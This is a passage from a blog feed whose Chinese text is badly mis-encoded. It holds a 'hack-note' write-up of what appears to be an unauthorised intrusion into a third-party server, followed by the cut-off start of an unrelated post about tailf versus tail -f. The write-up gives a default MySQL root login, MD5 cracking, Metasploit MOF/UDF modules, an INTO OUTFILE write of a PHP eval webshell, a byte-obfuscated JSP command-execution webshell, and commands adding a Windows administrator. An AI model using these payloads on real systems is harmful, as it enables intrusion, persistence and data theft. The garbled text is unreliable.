open     mysql         MySQL 5.5.40</div><div class="line">3389/tcp  open     ms-wbt-server Microsoft Terminal Service</div><div class="line">5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">8009/tcp  open     ajp13         Apache Jserv (Protocol v1.3)</div><div class="line">8080/tcp  open     http          Apache Tomcat/Coyote JSP engine 1.1</div><div class="line">49152/tcp open     unknown</div><div class="line">49153/tcp open     unknown</div><div class="line">49154/tcp open     unknown</div><div class="line">49155/tcp open     unknown</div></pre></div></div></figure><p>å…¶ä¸­æœ‰ä¸¤ä¸ªä¸ªè®©äººéå¸¸æ„Ÿå…´è¶£çš„æœåŠ¡åŠç«¯å£ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">3306Mysql</div><div class="line">3389RDP</div></pre></div></div></figure><h1 id="0x01-æ¸—é€"><a href="#0x01-æ¸—é€" class="headerlink" title="0x01 æ¸—é€"></a>0x01 æ¸—é€</h1><h2 id="1-éšæ‰‹ä¸€è¾“å…¥å¸¦æ¥çš„æƒŠå–œï¼"><a href="#1-éšæ‰‹ä¸€è¾“å…¥å¸¦æ¥çš„æƒŠå–œï¼" class="headerlink" title="1. éšæ‰‹ä¸€è¾“å…¥å¸¦æ¥çš„æƒŠå–œï¼"></a>1. éšæ‰‹ä¸€è¾“å…¥å¸¦æ¥çš„æƒŠå–œï¼</h2><p>çœ‹åˆ°å¸¸ç”¨ç«¯å£éƒ½æ²¡æœ‰æ›´æ”¹ï¼Œå¯¹å¤–æš´éœ²ã€‚çŒœæµ‹å®‰å…¨æ„è¯†ä¼°è®¡ä¹Ÿæ˜¯å¾ˆè–„å¼±ï¼Œéšä¾¿ç”¨<code>root</code>ï¼š<code>root</code>è¿æ¥mysqlã€‚</p><p><br></p><p><strong>Duang, Duang, Duang</strong></p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00104.jpg" alt="kionf"></p><blockquote><p>æœ‰æ—¶å€™å°±æ˜¯è¿™æ ·ç™¾å¯†ä¸€ç–ï¼Œå®‰å…¨é—®é¢˜çš„é‡ä¸­ä¹‹é‡å°±æ˜¯ç»†èŠ‚<br>å¯èƒ½ä½ åœ¨æƒ³è¿™ä¹ˆLowé€¼ä¹Ÿå¥½æ„æ€å†™ï¼Ÿé‚£ä¹ˆä½ é”™äº†ï¼Œé‡å¤´æˆåœ¨åå¤´ï¼</p></blockquote><p>è¿æ¥åï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹æ•°æ®åº“ï¼Œæ ¹æ®åç§°æ‰¾åˆ°å½“å‰ç½‘ç«™æ‰€ä½¿ç”¨æ•°æ®åº“ã€‚æ ¹æ®è¡¨åæ‰¾åˆ°å¤§æ¦‚ä¸ºç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯è¡¨</p><hr><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00105.jpg" alt="kionf"></p><p>å·²åˆ°å¤œæ·±ï¼Œä¸æƒ³å†åŠ³ä½“ä¼¤èº«ï¼Œéšä¾¿æ‰¾ä¸ªç”¨æˆ·åï¼Œmd5å¯†ç æ‰”åˆ°<a href="http://www.dmd5.com/" target="_blank" rel="noopener">dmd5</a>è§£å¯†å‡ºæ˜æ–‡ï¼Œæœ¬ä»¥ä¸ºèƒ½ç™»é™†è¿™äº‹å„¿å°±ç®—äº†ï¼Œæ”¾ä»–ä¸€é©¬ã€‚</p><blockquote><p><strong>But !</strong></p></blockquote><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00106.jpg" alt="kionf"></p><p>æç¤ºè´¦å·å¯†ç é”™è¯¯ï¼Œåˆå°è¯•äº†å‡ ä¸ªè´¦å·å‘ç°ï¼Œè¢«ç¦ç”¨ ï¼ï¼é€šè¿‡æŸ¥çœ‹æ•°æ®åº“è®°å½•çš„ç™»é™†ä¿¡æ¯andçŒœæµ‹ï¼Œå¾—å‡ºåº”è¯¥ç°åœ¨çš„ç½‘ç«™å¹¶æ²¡æœ‰è¿æ¥æ­¤æ•°æ®åº“ã€‚æ·±å¤œçš„æˆ‘æ‰£äº†æ‰£è„šä¸«å­ï¼Œå‘ç°äº‹æƒ…å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚</p><p><br></p><p>è™½ç„¶æ²¡æœ‰ä½¿ç”¨ç°åœ¨çš„æ•°æ®åº“ï¼Œä½†æˆ‘ä»¬æ˜¯æœ‰<code>root</code>ç™»é™†åˆ°æ•°æ®åº“çš„å•Šï¼Œæƒé™é«˜å•Šï¼Œææƒå•Šï¼</p><p><strong>Letâ€™s Go</strong></p><hr><h2 id="2-å¸¸ç”¨Lowé€¼Mysqlææƒå‡ ç§æ–¹å¼ï¼š"><a href="#2-å¸¸ç”¨Lowé€¼Mysqlææƒå‡ ç§æ–¹å¼ï¼š" class="headerlink" title="2. å¸¸ç”¨Lowé€¼Mysqlææƒå‡ ç§æ–¹å¼ï¼š"></a>2. å¸¸ç”¨Lowé€¼Mysqlææƒå‡ ç§æ–¹å¼ï¼š</h2><ul><li>UDFææƒ</li><li>MOFææƒ</li><li><code>into outfile</code>å†™å…¥shell</li></ul><p>ç¥­å‡ºæˆ‘çš„å®è´ <code>metasploit</code></p><h3 id="1-MOFææƒ"><a href="#1-MOFææƒ" class="headerlink" title="1) MOFææƒ"></a>1) MOFææƒ</h3><figure class="highlight sh"><figcaption><span class="caption">è„šæœ¬å°å­ä¸‰éƒ¨æ›²</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># 1. å¯åŠ¨msfé€‰æ‹©exploit</span></div><div class="line"></div><div class="line">&gt; msfconsole</div><div class="line"></div><div class="line">&gt; search mysql_mof</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                             Disclosure Date  Rank       Description</div><div class="line">   ----                             ---------------  ----       -----------</div><div class="line">   exploit/windows/mysql/mysql_mof  2012-12-01       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</div><div class="line"></div><div class="line">&gt; use exploit/windows/mysql/mysql_mof</div><div class="line"></div><div class="line"><span class="comment"># 2. è®¾ç½®ç›®æ ‡</span></div><div class="line"></div><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; show options</div><div class="line"><span class="comment"># show advanced</span></div><div class="line"><span class="comment"># æ˜¾ç¤ºé«˜çº§é€‰é¡¹ï¼Œè¿›è¡Œè‡ªå®šä¹‰è¿™é‡Œä¸éœ€è¦æš‚ä¸”ä¸å±•å¼€è®¨è®º</span></div><div class="line"></div><div class="line"></div><div class="line">Module options (exploit/windows/mysql/mysql_mof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   PASSWORD                   yes       The password to authenticate with</div><div class="line">   RHOST                      yes       The target address</div><div class="line">   RPORT     3306             yes       The target port (TCP)</div><div class="line">   USERNAME                   yes       The username to authenticate as</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   MySQL on Windows prior to Vista</div><div class="line"></div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div><div class="line"></div><div class="line"><span class="comment"># 3. å¯åŠ¨</span></div><div class="line">&gt; exploit</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00107.jpg" alt="kionf"></p><p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ²¡æœ‰è¿”å›sessionï¼Œ åˆ©ç”¨ç¨‹åºå¯èƒ½è¢«åˆ é™¤</p><hr><h3 id="2-UDFææƒ"><a href="#2-UDFææƒ" class="headerlink" title="2) UDFææƒ"></a>2) UDFææƒ</h3><figure class="highlight sh"><figcaption><span class="caption">å°è¯•UDFææƒ</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; search mysql_udf</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank       Description</div><div class="line">   ----                                   ---------------  ----       -----------</div><div class="line">   exploit/multi/mysql/mysql_udf_payload  2009-01-16       excellent  Oracle MySQL UDF Payload Execution</div><div class="line"></div><div class="line">&gt; use exploit/multi/mysql/mysql_udf_payload</div><div class="line">&gt; show options</div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00108.jpg" alt="kionf"></p><p>æ³¨æ„çº¢æ¡†åœˆå‡ºä½ç½®ï¼Œæ ¹æ®ç›®å½•ç»“æ„åˆ¤æ–­æ˜¯PhpStudyæ­å»ºçš„ï¼Œåé¢ä¼šä½¿ç”¨åˆ°</p><p>ä¾æ—§æ²¡æœ‰æˆåŠŸè¿”å›sessionï¼Œæœ‰å°è¯•äº†å‡ æ¬¡MOFï¼Œå‘ç°è¿æ¥Mysqlè¢«æ‹’ç»äº†ã€‚è¿™æ—¶æ‰æƒ³èµ·æœºå™¨æ—¶éƒ¨ç½²åœ¨é˜¿é‡Œäº‘ï¼Œæœ‰ä¸€ä¸ª<code>AliYunDun</code>è¿™ä¸ªå°å¯çˆ±ï¼Œä¸Šé¢MOFçš„ææƒæ–‡ä»¶åº”è¯¥ä¹Ÿæ˜¯ä»–åˆ é™¤çš„ã€‚</p><hr><h3 id="3-å°è¯•å†™å…¥WebShell"><a href="#3-å°è¯•å†™å…¥WebShell" class="headerlink" title="3) å°è¯•å†™å…¥WebShell"></a>3) å°è¯•å†™å…¥WebShell</h3><p>ç”±ä¸Šé¢åœ¨è¿›è¡ŒUDFææƒæ—¶çˆ†å‡ºæ¥çš„æ˜¯ä½¿ç”¨<code>PhpStudy</code>æ­å»ºçš„webç¯å¢ƒï¼Œå¯ä»¥çŒœæµ‹å‡ºé»˜è®¤Webè·¯å¾„ï¼Œä½¿ç”¨ä»£ç†è¿æ¥ç›®æ ‡Mysqlæ‰§è¡Œï¼š</p><figure class="highlight sql"><figcaption><span class="caption">æŸ¥çœ‹Mysql datadir</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">&gt; select @@datadir;</div><div class="line"></div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| @@datadir                   |</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| D:\phpStudy4IIS\MySQL\data\ |</div><div class="line">+<span class="comment">-----------------------------+</span></div></pre></div></div></figure><p>æœ¬æœºä¸‹è½½ç›¸å¯¹åº”ç‰ˆæœ¬<code>å®‰è£…åŒ…</code>ï¼Œå®‰è£…åæŸ¥çœ‹åˆ°é»˜è®¤Webè·¯å¾„ä¸º<code>D:\phpStudy4IIS\WWW</code>ã€‚okæ—¢ç„¶ç½‘ç«™ç›®å½•å¾—åˆ°äº†å¹¶ä¸”é€šè¿‡ä¹‹å‰çš„ä¿¡æ¯æ”¶é›†å¾—åˆ°ä½¿ç”¨çš„æ˜¯ThinkPHPï¼Œæˆ‘ä»¬å°±å°è¯•å†™å…¥PHPä¸€å¥è¯Shellã€‚</p><figure class="highlight sql"><figcaption><span class="caption">è¿æ¥ç›®æ ‡Mysqlå†™å…¥Web Shell</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -proot -h115.28.xxx.xxx mysql</div><div class="line"></div><div class="line"># å†™å…¥PHP shell</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/root/sys_thinkphp.php'</span>) <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\phpStudy4IIS\WWW\sys.php'</span></div></pre></div></div></figure><p>PHP Shellæ–‡ä»¶ï¼ˆè‡ªå®šä¹‰å’Œæ­£å¸¸èœåˆ€ä¸é€šç”¨ï¼‰ï¼š</p><figure class="highlight php"><figcaption><span class="caption">sys_thinkphp</span><span class="suffix">.php</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$thinkss = create_function(<span class="string">'$a'</span>, <span class="string">'ev'</span>.<span class="string">'al($a);'</span>);</div><div class="line"></div><div class="line">$thinkss(stripslashes($_POST[<span class="string">'***REMOVED***'</span>]));</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></div></div></figure><p>ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæ²¡è¦æŠ¥404ã€‚shellå†™å…¥æˆåŠŸï¼ï¼</p><hr><h2 id="3-è¿›ä¸€æ­¥æ¸—é€"><a href="#3-è¿›ä¸€æ­¥æ¸—é€" class="headerlink" title="3. è¿›ä¸€æ­¥æ¸—é€"></a>3. è¿›ä¸€æ­¥æ¸—é€</h2><p>ä½¿ç”¨èœåˆ€è¿æ¥ï¼š</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00109.jpg" alt="kionf"></p><p>è·å–shellï¼Œé€šè¿‡æŸ¥çœ‹ç›®å½•ç»“æ„ã€åŠaspã€phpã€tomcatä»£ç ï¼Œè¿™é‡Œçœç•¥ä¸€ä¸‡å­—ï¼Œè·å–å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">ç¯å¢ƒ:</div><div class="line">tomcat7.0</div><div class="line">IIS</div><div class="line">mysql</div><div class="line">aspxç½‘ç«™è·¯å¾„</div><div class="line"></div><div class="line">æŸ¥çœ‹ä»£ç å‘ç°è¿æ¥æ•°æ®åº“ä¸ºå¹¶å¾—åˆ°å¯†ç :</div><div class="line">Mysql: 114.215.xxx.xxx</div><div class="line">Mysql: 115.29.xx.xxx</div><div class="line">SqlServer: 115.29.xx.xxx</div></pre></div></div></figure><p><strong>å¸¸ç”¨WEBæœåŠ¡é…ç½®æ–‡ä»¶ä½ç½®ï¼š</strong></p><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">ThinkPhp:  ./www/ThinkPHP/Conf/       ./www/Application/Common/Conf/</div><div class="line">Tomcat: ./tomcat/webapps/appname/WEB-INF/classes/</div><div class="line">IIS: ./www/Web.config</div></pre></div></div></figure><h2 id="4-ä¼‘æˆ˜"><a href="#4-ä¼‘æˆ˜" class="headerlink" title="4. ä¼‘æˆ˜"></a>4. ä¼‘æˆ˜</h2><div class="note info"><p>ä½¿ç”¨èœåˆ€è¿æ¥shellç”±äºç¯å¢ƒé—®é¢˜æ— æ³•æ‰§è¡Œç»ˆç«¯å‘½ä»¤ã€‚çœ‹åˆ°æœ‰tomcatåº”ç”¨ï¼Œå°±ä¼ ä¸Šä¸ªå°jspé©¬æ¥æ‰§è¡Œå‘½ä»¤,æ·»åŠ ä¸ªç”¨æˆ·</p></div><figure class="highlight"><figcaption><span class="caption">jspå°é©¬é©¬</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></div><div class="code"><pre><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</div><div class="line">&lt;HTML&gt;</div><div class="line">&lt;title&gt;Titanium&lt;/title&gt;</div><div class="line">&lt;BODY&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</div><div class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</div><div class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</div><div class="line">&lt;/FORM&gt;</div><div class="line"></div><div class="line">&lt;%!</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception</span>&#123;</div><div class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</div><div class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</div><div class="line">            str = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">32</span>&#125;) + str;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            str =  <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">32</span>&#125;) + str;</div><div class="line">        &#125;</div><div class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</div><div class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;),  <span class="keyword">new</span> Object[] &#123; str &#125;);</div><div class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</div><div class="line">        String result = <span class="string">""</span>;</div><div class="line">        result = sc.hasNext() ? sc.next() : result;</div><div class="line">        sc.close();</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line">%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">    String name =<span class="string">"Input Nothing"</span>;</div><div class="line">    String query = request.getParameter(<span class="string">"q"</span>);</div><div class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</div><div class="line">        name = getPicture(query);</div><div class="line">    &#125;</div><div class="line">%&gt;</div><div class="line"></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;%= name %&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"></div><div class="line">&lt;/BODY&gt;</div><div class="line">&lt;/HTML&gt;</div></pre></div></div></figure><figure class="highlight sh"><figcaption><span class="caption">æ·»åŠ Winç”¨æˆ·è®¾ä¸ºç®¡ç†å‘˜</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">net user kionf kionf /add</div><div class="line">net localgroup adminostrators kionf /add</div></pre></div></div></figure><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00115.jpg" alt="kionf"></p><p>é€šè¿‡æŸ¥çœ‹phpä»£ç åˆ†æå‡ºï¼Œæˆ¿æºç½‘ç«™è¿æ¥çš„æ˜¯<code>SqlServer: 115.29.xx.xxx</code>ï¼Œç”¨æˆ·ç™»å½•é€šè¿‡æŸ¥è¯¢ä¸¤ä¸ªè¡¨ã€‚mysqlç”¨æˆ·è¡¨è®°å½•ç”¨æˆ·å¯ä»¥ç™»å½•ipæ•°ï¼ŒåŠç»‘å®šip,å¦‚æœFirstå­—æ®µä¸º0åˆ™ä¸ºé¦–æ¬¡ç™»é™†ï¼Œé¦–æ¬¡ç™»é™†ipå†™å…¥æ•°æ®åº“ï¼Œè´¦å·å¯†ç å‚¨å­˜åœ¨SqlServerã€‚  ç™»é™†ä¹‹ï¼</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00114.jpg" alt="kionf"></p><hr><h1 id="0x02-åƒé‡Œä¹‹å ¤ï¼Œæºƒäºèšç©´"><a href="#0x02-åƒé‡Œä¹‹å ¤ï¼Œæºƒäºèšç©´" class="headerlink" title="0x02 åƒé‡Œä¹‹å ¤ï¼Œæºƒäºèšç©´"></a>0x02 åƒé‡Œä¹‹å ¤ï¼Œæºƒäºèšç©´</h1><p><br></p><p>åœ¨ä¸Šé¢<a href="#3-è¿›ä¸€æ­¥æ¸—é€">è¿›ä¸€æ­¥æ¸—é€ä¸­</a>è·å–åˆ°ä¸€ä¸ªæ•°æ®åº“ï¼š</p><blockquote><p>Mysql: 114.215.xxx.xxx</p></blockquote><p>æ ¹æ®ThinkPHPæ¡†æ¶é…ç½®æ–‡ä»¶ä¸­çš„è´¦å·å¯†ç ï¼Œè¿æ¥åæŸ¥çœ‹æ•°æ®åº“:</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00110.jpg" alt="kionf"></p><figure class="highlight sql"><figcaption><span class="caption">æ‰§è¡Œsql</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> @@hostname;</div><div class="line"></div><div class="line">iZxxxxxxxx</div></pre></div></div></figure><p>å°è¯•Googleä¸‹è¿™ä¸ªç‰¹åˆ«çš„hostnameï¼Œå‡ºç°äº†æƒŠå–œï¼š</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00111.jpg" alt="kionf"></p><p>è¿›ä¸€æ­¥éªŒè¯å¾—å‡ºç½‘ç«™è·¯å¾„ï¼š</p><blockquote><p><code>nmap</code>æ‰«ææœºå™¨ï¼Œå¾—å‡ºWEBç«¯å£è®¿é—®<code>80</code>ç«¯å£<code>404</code>ï¼Œè®¿é—®443æˆåŠŸå‡ºç°ç•Œé¢ï¼Œæ‰‹æµ‹æ¡†æ¶çˆ†å‡ºWebè·¯å¾„ï¼š</p></blockquote><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00112.jpg" alt="kionf"></p><p>é€šè¿‡Mysqlå†™å…¥ä¸€å¥è¯ï¼Œèœåˆ€è¿ä¹‹ï¼š</p><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00113.jpg" alt="kionf"></p><blockquote><p>rootå¯åŠ¨çš„nginxï¼Œæƒé™å°±ä¸ç”¨è¯´äº†ï¼Œæ ¹æ®è·å–ä¿¡æ¯Googleæ­¤å…¬å¸titleï¼Œå¾—çŸ¥æ˜¯ä¸€ä¸ªè½¯ä»¶å¤–åŒ…å…¬å¸ï¼Œ<br><code>114.215</code>æ­¤å°æœºå™¨åº”è¯¥ä¸ºå†…éƒ¨å¼€å‘æµ‹è¯•æœºå™¨ã€‚è€Œä¸”<br>æ­¤æœºå™¨å®‰è£…æœ‰<code>SVN</code>,<code>wwwroot</code>ç›®å½•ä¸‹æ”¾ç½®æ˜¯å¤–åŒ…çš„é¡¹ç›®ä»£ç ï¼Œç»§ç»­å»¶ä¼¸æ¸—é€åº”è¯¥ä¼šæ‹¿ä¸‹æ•´ä¸ªå¤–åŒ…å…¬å¸æ‰€æœ‰æœºå™¨çš„æƒé™ã€‚<br>æ“ä½œè¿‡ç¨‹æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œéƒ½æ˜¯ç‚¹å­éªšï¼Œå¼€å‘è¿‡ç¨‹ä¸­å®‰å…¨æ„è¯†è–„å¼±ï¼Œä¿¡æ¯æ³„æ¼ã€‚<br>åˆšåˆšå»å«ç”Ÿé—´å¤´çªç„¶æ™•äº†ä¸€ä¸‹ï¼Œå·®ç‚¹æ‘”å€’ã€‚<strong>æˆ‘ç°åœ¨æ…Œçš„ä¸€æ‰¹ğŸ˜¨</strong> èº«ä½“é‡è¦ä¸å¼„äº†ã€‚</p></blockquote>]]></content>
      
      <categories>
          
          <category> hack-note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯•å°è®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>tailf å’Œ tail -f åŒºåˆ«</title>
      <link href="/2018/09/07/linux-tailf/"/>
      <url>/2018/09/07/linux-tailf/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>å¯¹äºå°æ–‡ä»¶ (å¤§çº¦å°äº5GB) ä½¿ç”¨<strong><code>tailf</code></strong>ï¼Œ <strong><code>tail -f</code></strong> æ²¡æœ‰æ˜æ˜¾åŒºåˆ«ã€‚ ä¸€æ¬¡å¶ç„¶ä½¿ç”¨<strong><code>tailf</code></strong>æŸ¥çœ‹ä¸€ä¸ª20GBæ—¥å¿—æ–‡ä»¶æ—¶ï¼Œ å‘ç°æ— æ³•æ˜¾ç¤ºï¼Œ è€Œä½¿ç”¨<strong><code>tail -f</code></strong>å´å¯ä»¥æ˜¾ç¤ºã€‚ç”±æ­¤å»¶ä¼¸å‡ºæœ¬æ–‡ </p></blockquote><a id="more"></a><h1 id="0x00-å‡†å¤‡å®éªŒç¯å¢ƒ"><a href="#0x00-å‡†å¤‡å®éªŒç¯å¢ƒ" class="headerlink" title="0x00 å‡†å¤‡å®éªŒç¯å¢ƒ"></a>0x00 å‡†å¤‡å®éªŒç¯å¢ƒ</h1><p><br></p><p>å°è¯•ç›´æ¥<code>google</code>ä¸¤è€…çš„åŒºåˆ«å‘ç°å¤§éƒ¨åˆ†è¯´çš„ä¸æ˜¯å¾ˆè¯¦ç»†ï¼ŒæŠ„çš„ä¹Ÿä¸æ˜¯å¾ˆå¥½ã€‚æ‰€ä»¥è‡ªå·±å†™ä¸‹æ¥åšä¸ªç¬”è®°ã€‚</p><h2 id="1-ç”Ÿæˆå¤§æ–‡ä»¶10GB"><a href="#1-ç”Ÿæˆå¤§æ–‡ä»¶10GB" class="headerlink" title="1. ç”Ÿæˆå¤§æ–‡ä»¶10GB"></a>1. ç”Ÿæˆå¤§æ–‡ä»¶10GB</h2><figure class="highlight sh"><figcaption><span class="caption">ä½¿ç”¨ddç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">dd <span class="keyword">if</span>=/dev/urandom of=bigFile bs=10M count=1000</div></pre></div></div></figure><h2 id="2-å®‰è£…straceè·Ÿè¸ªè¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨"><a href="#2-å®‰è£…straceè·Ÿè¸ªè¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨" class="headerlink" title="2. å®‰è£…straceè·Ÿè¸ªè¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨"></a>2. å®‰è£…<code>strace</code>è·Ÿè¸ªè¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨</h2><figure class="highlight sh"><div class="figcode"><div class="code"><pre><div class="line">yum -y install strace</div></pre></div></div></figure><h2 id="3-æµ‹è¯•è½½å…¥æ—¶é—´"><a href="#3-æµ‹è¯•è½½å…¥æ—¶é—´" class="headerlink" title="3. æµ‹è¯•è½½å…¥æ—¶é—´"></a>3. æµ‹è¯•è½½å…¥æ—¶é—´</h2><p>åˆ†åˆ«ä½¿ç”¨ <code>tailf</code>ï¼Œ<code>tail -f</code>æŸ¥çœ‹åˆšæ‰ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ˜æ˜¾æ„Ÿè§‰<code>tailf</code>æ¯”<code>tail -f</code>æ—¶é—´é•¿</p><p><br></p><h1 id="0x01-åˆ†æä¸¤è€…ä½¿ç”¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè°ƒç”¨åŒºåˆ«"><a href="#0x01-åˆ†æä¸¤è€…ä½¿ç”¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè°ƒç”¨åŒºåˆ«" class="headerlink" title="0x01 åˆ†æä¸¤è€…ä½¿ç”¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè°ƒç”¨åŒºåˆ«"></a>0x01 åˆ†æä¸¤è€…ä½¿ç”¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè°ƒç”¨åŒºåˆ«</h1><figure class="highlight shell"><figcaption><span 